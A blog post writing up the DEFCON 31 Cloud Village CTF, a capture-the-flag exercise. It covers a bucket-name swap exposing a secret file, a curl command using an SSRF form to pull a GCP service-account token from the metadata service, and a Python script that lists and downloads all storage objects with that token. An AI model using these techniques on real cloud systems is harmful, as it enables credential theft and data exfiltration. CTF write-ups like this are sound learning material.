---
layout: post
title:  "DefCon Cloud Village CTF Writeup"
date:   2023-08-28 12:41:18 -0500
categories: conference ctf
---

This is a write up of the DEFCON 31 Cloud Village CTF.

Part of getting through this included getting podman up and running on my chromebook. This required some messing around with LXC settings and crosh, mostly documented here, but there were some additional cgroups settings which needed to be changed documented here

I got 50th out of 200+ with only 3 flags. My machine didn't work for some of the challenges unfortunately, for example the aarch64 container and golang binary which didn't run on my x86 system

# Getting to Gnome Each Other

Flag is in the description. Copy and paste the flag from the description into the text box and hit submit.

# Gnome University

We are presented with an S3-hosted page listing some papers from previous year's cloud villages. The filename of the flag is given to us in the description as secret.txt.

[http://cloudfilestore.s3-website-eu-west-1.amazonaws.com/](http://cloudfilestore.s3-website-eu-west-1.amazonaws.com/)

Looking at the source of this page, there are some js functions which interact with a lambda function:

```js
const apiEndpoint = 'https://3k93nsmmy5.execute-api.eu-west-1.amazonaws.com/cloudev1';

// Function to fetch the presigned URL for a file
function fetchPresignedUrl(file, callback) {
    $.ajax({
        url: apiEndpoint + '/download?file_name=' + file + "&storage=research-gnomes-prod",
        type: 'GET',
        success: function(response) {
            console.log('Presigned URL:', response.body.presigned_url.body);
            callback(response.body.presigned_url.body);
        },
        error: function(error) {
            console.error('Error getting presigned URL:', error);
            callback(null); // Call the callback with null in case of an error
        }
    });
}
```

The API call in fetchPresignedUrl takes a bucket name in the storage parameter. It's hardcoded in the function, but if we try to access `secret.txt` in this particular bucket, we get a KeyError, which tells us that the file we're looking for isn't there. If we switch "research-gnomes-prod" for "research-gnomes-dev" and make our call, we get back a signed url, which takes us to the flag.

# Digital Forest

This puzzle has to do with the instance metadata service and enumerating buckets with credentials obtained from that instance metadata service.

We are presented with a simple web UI which accepts a URL and a POST body payload, and returns a response. We are given the hint in the description of the challenge that this challenge is on GCP.

We can skip using the UI by posting directly to the endpoint with `curl`, which lets us manipulate the json responses more conveniently with `jq`. I can access the metadata service for the host this service is running on  like this:

```bash
curl -X POST -d 'inputUrl=http://metadata.google.internal/computeMetadata/v1/project/project-id&inputHeader={"Metadata-Flavor": "Google"}' https://leaky-bucket-jobztbckaq-uc.a.run.app/result
```

I can generate an auth token with the metadata service. I can find the account email `leakybucket@optimal-jigsaw-390814.iam.gserviceaccount.com`, and generate an access token with `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/leakybucket@optimal-jigsaw-390814.iam.gserviceaccount.com/token`

`https://cloud.google.com/compute/docs/access/create-enable-service-accounts-for-instances#applications` tells me how to use that access token

We can use this access token to list buckets and objects, which you can see in the code snippet below.

We can take those listed buckets and objects and download each file, which is also in the code snippet below. One of those downloaded files contained the flag, and we beat this challenge.

```py
#!/usr/bin/env python3

from google.cloud import storage
import requests

project_id = <project id goes here>
access_token = <access token goes here>

def list_buckets(project_id: str, access_token: str) -> list:
    url = "https://www.googleapis.com/storage/v1/b"
    params = {"project": project_id}
    headers = {"Authorization": f"Bearer {access_token}"}

    r = requests.get(url, params=params, headers=headers)
    r.raise_for_status()

    rjson = r.json()

    bucket_names = []

    for response in r.json()['items']:
        bucket_names.append(response['name'])

    return bucket_names

def list_objects_in_buckets(project_id: str, access_token: str, bucket_names: list) -> list:
    url = "https://www.googleapis.com/storage/v1/b/"
    headers = {"Authorization": f"Bearer {access_token}"}

    buckets = []

    for bucket_name in bucket_names:
        bucket_url = url + bucket_name + '/o'

        r = requests.get(bucket_url, headers=headers)
        r.raise_for_status()

        buckets.append(r.json())

    retval = []

    for bucket_contents in buckets:
        try:
            for files in bucket_contents['items']:
                retval.append(files['mediaLink'])
        except KeyError:
            print("Nothing in bucket, moving along")
            
    
    print(retval)
    return retval

def download_all_objects(file_urls: list) -> None:
    headers = {"Authorization": f"Bearer {access_token}"}

    for file_url in file_urls:
        try:
            local_filename = file_url.split('/')[-1]
            # NOTE the stream=True parameter below
            with requests.get(file_url, stream=True, headers=headers) as r:
                r.raise_for_status()
                with open(local_filename, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=8192): 
                        # If you have chunk encoded response uncomment if
                        # and set chunk_size parameter to None.
                        #if chunk: 
                        f.write(chunk)
        except requests.exceptions.HTTPError:
            print("couldn't download {}".format(file_url))

buckets = list_buckets(project_id, access_token)

print(buckets)

objects = list_objects_in_buckets(project_id, access_token, buckets)

print(objects)

download_all_objects(objects)
```

# Rumors

This challenge was a tar pit for me. The prompt for this challenge was that there was a container that the gnomes were looking at and the flag could be found by looking at what the container did.

Before I even started this challenge I needed to get my machine to be able to run docker containers. I've pretty much abandoned Docker Desktop since their licensing changed in favor of using Podman, which has a better security posture when run rootless anyway. So, I installed podman via apt, and it didn't work. There were some missing libraries not defined in the apt package. I installed the dependencies, and that got us to another error about a missing OCI method. I spent a bunch of time googling and applying various changes in response to various errors, most of which are documented  [here](https://ntk.me/2021/05/14/podman-in-crostini/) and [here](https://bugs.chromium.org/p/chromium/issues/detail?id=860565). Eventually I got to a point where I should be able to run a container, and I tested this with the hello world container on docker hub, which worked. I tried again to run the CTF container, and it failed. Looking at the registry, I saw that this container was built for ARM machines, and I was on an x86 machine. I still tried to find the flag through some other techniques though, there are a few ways we can learn more about what's in a container even if we can't run it.

`podman image inspect` can give us, among other information, the composition of the various dockerfiles that were used to build the container. I checked this, thinking maybe an environment variable might contain some creds, or a script file I can read in cleartext, or maybe a cred file in ~/.gcp or some such similar place. Unfortunately, the only thing of interest it told me was that there was a golang binary that was transferred into the container, and that's all I had to work off. This binary was not executable for me on an x86 machine, it was built for ARM. Regardless, I disassembled the golang binary to see if there were any plaintext magic strings I could look for, maybe a URL somewhere, but I didn't see any, unfortunately. This is where I left this challenge at around 3 in the morning. 

According to people on the Cloud Village Discord after the CTF closed, the flag's pretty easy to find if you can run the container. The golang binary reaches out to an unsecured S3 bucket which contains both a shell script that the binary executes as well as the flag. Intercepting and logging the traffic out of the container is all you have to do, very simple and straightforward.

# Gotta Go Gnome

We are presented with a page that generates bearer tokens. According to people on Discord who did this challenge, the project id is the same as the Digital Forest challenge, which I did not know. I spent a bunch of time trying to find an API that would tell me what project my current credentials had access to, but didn't find one lol. Didn't get the flag.
